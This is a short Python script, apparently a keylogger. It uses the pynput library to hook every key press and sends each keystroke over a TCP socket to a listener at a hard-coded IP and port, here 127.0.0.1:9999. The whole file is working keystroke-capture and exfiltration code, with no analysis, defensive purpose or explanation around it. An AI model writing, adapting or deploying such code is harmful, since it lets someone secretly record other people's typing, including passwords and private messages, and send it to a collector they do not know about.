from pynput import keyboard
import socket

IP = "127.0.0.1"

PORT = 9999
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.connect((IP,PORT))
def on_press(key):
    str_key = f'{key}'
    client_socket.send(str_key.encode('utf-8'))

def on_release(key):
    # print(key)
    pass
listener = keyboard.Listener(on_press=on_press,on_release=on_release)

listener.start()
listener.join()
